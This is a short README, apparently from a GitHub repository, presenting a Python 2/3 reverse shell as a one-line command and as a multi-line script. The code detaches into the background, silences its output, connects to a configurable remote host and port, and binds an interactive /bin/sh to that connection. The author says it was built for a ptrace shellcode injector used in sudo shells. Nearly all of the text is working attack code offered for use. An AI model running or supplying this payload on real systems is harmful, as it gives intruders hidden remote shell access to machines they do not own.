# python 2 & 3 reverse shell one liner detached (background) By David Reguera Garcia aka Dreg

Just change the part: "127.0.0.1",9999

python 2 & python 3:
```
python -c 'exec("""\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect(("127.0.0.1",9999))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n""")'
```

I made this for my shellcode injector in sudo shells via ptrace:

https://github.com/David-Reguera-Garcia-Dreg/drx_ptrace_shellcode_injector

https://github.com/David-Reguera-Garcia-Dreg/ptrace_misconfiguration_local_privilege_escalation

https://github.com/David-Reguera-Garcia-Dreg/

http://www.fr33project.org

dreg@fr33project.org

multi line code:
```
import socket,subprocess,os,sys

pidrg = os.fork()
if pidrg > 0:
	sys.exit(0)

os.chdir("/")

os.setsid()

os.umask(0)

drgpid = os.fork()
if drgpid > 0:
	sys.exit(0)

sys.stdout.flush()

sys.stderr.flush()

fdreg = open("/dev/null", "w")

sys.stdout = fdreg

sys.stderr = fdreg

sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sdregs.connect(("127.0.0.1",9999))

os.dup2(sdregs.fileno(),0)

os.dup2(sdregs.fileno(),1)

os.dup2(sdregs.fileno(),2)

p=subprocess.call(["/bin/sh","-i"])
```

http://jagt.github.io/python-single-line-convert/
